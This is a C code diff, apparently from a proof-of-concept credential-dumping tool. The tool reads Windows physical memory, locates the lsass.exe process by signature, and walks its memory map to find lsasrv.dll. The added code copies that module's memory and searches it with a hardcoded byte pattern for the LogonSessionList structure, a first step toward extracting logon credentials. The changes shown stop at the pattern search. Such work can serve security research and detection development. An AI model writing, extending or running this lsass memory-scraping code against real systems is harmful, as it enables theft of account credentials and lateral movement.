@@ -20,6 +20,9 @@ typedef struct {
     CHAR  ImageFileName[15];
 } EPROCESS_NEEDLE;
 
+typedef struct {
+    CHAR LogonSessionList[12];
+} LOGONSESSIONLIST_NEEDLE;
 
 
 typedef struct{
@@ -148,6 +151,9 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
 
     VAD* vadList = NULL;
 
+
+    ULONGLONG LogonSessionList = 0;
+
     printf("[+] Starting to walk _RTL_AVL_TREE...\n");
     queue = (ULONGLONG *)malloc(sizeof(ULONGLONG) * VadCount * 4);
     queue[0] = VadRoot; // Node 0
@@ -165,6 +171,7 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
         ULONGLONG filename = 0;
         USHORT pathLen = 0;
         LPWSTR path = NULL;
+        
 
         // printf("Cursor [%lld]\n", cursor);
         currentNode = queue[cursor]; // Current Node, at start it is the VadRoot pointer
@@ -276,6 +283,46 @@ void walkAVL(ULONGLONG VadRoot, ULONGLONG VadCount) {
         }
     }
     printf("\t\t================================================\n");
+
+    // LOGONSESSIONLIST_NEEDLE LogonSessionList_needle = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
+    for (int i = 0; i < VadCount; i++) {
+        if (!strcmp(vadList[i].image, "\\Windows\\System32\\lsasrv.dll")) {
+            ULONGLONG start = 0;
+            ULONGLONG end = 0;
+            LARGE_INTEGER large_start;
+            start = vadList[i].start;
+            end = vadList[i].end;
+            printf("[!] LsaSrv.dll found! [0x%08llx-0x%08llx] (%lld bytes)\n", vadList[i].start, vadList[i].end, vadList[i].size);
+            char *lsasrv = NULL;
+            ULONGLONG j = 0;
+
+            lsasrv = (char*)malloc(vadList[i].size);
+
+            while (start < end) {
+                DWORD bytes_read = 0;
+                DWORD bytes_written = 0;
+                CHAR tmp = NULL;
+                large_start.QuadPart = v2p(start);
+                result = SetFilePointerEx(pmem_fd, large_start, NULL, FILE_BEGIN);
+                result = ReadFile(pmem_fd, &tmp, 1, &bytes_read, NULL);
+                lsasrv[j] = tmp;
+                j++;
+                start = vadList[i].start + j;
+            }
+
+            LOGONSESSIONLIST_NEEDLE LogonSessionList_needle = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
+            PBYTE needle_buffer = (PBYTE)malloc(sizeof(LOGONSESSIONLIST_NEEDLE));
+            memcpy(needle_buffer, &LogonSessionList_needle, sizeof(LOGONSESSIONLIST_NEEDLE));
+            int offset = 0;
+            offset = memmem((PBYTE)lsasrv, j, needle_buffer, sizeof(LOGONSESSIONLIST_NEEDLE));
+            
+
+            break;
+        }
+    }
+    
+
+
     free(vadList);
     free(queue);
     return;
@@ -347,14 +394,13 @@ int main(int argc, char** argv) {
             result = ReadFile(pmem_fd, largebuffer, to_write, &bytes_read, NULL);
             EPROCESS_NEEDLE needle_root_process = {"lsass.exe"};
             
-
             PBYTE needle_buffer = (PBYTE)malloc(sizeof(EPROCESS_NEEDLE));
             memcpy(needle_buffer, &needle_root_process, sizeof(EPROCESS_NEEDLE));
             int offset = 0;
-            offset = memmem((PBYTE)largebuffer, bytes_read, needle_buffer, sizeof(EPROCESS_NEEDLE));
+            offset = memmem((PBYTE)largebuffer, bytes_read, needle_buffer, sizeof(EPROCESS_NEEDLE));     
             if (offset >= 0) {
                 if (largebuffer[offset + 15] == 2) { //Priority Check
-                    if (largebuffer[offset - 0x168] == 0x88 && largebuffer[offset - 0x167] == 0x02) { //PID check, hardcoded for PoC
+                    if (largebuffer[offset - 0x168] == 0x70 && largebuffer[offset - 0x167] == 0x02) { //PID check, hardcoded for PoC
                         printf("signature match at 0x%08llx!\n", offset + start);
                         printf("[+] EPROCESS is at 0x%08llx [PHYSICAL]\n", offset - 0x5a8 + start);
                         memcpy(&DirectoryTableBase, largebuffer + offset - 0x5a8 + 0x28, sizeof(ULONGLONG));
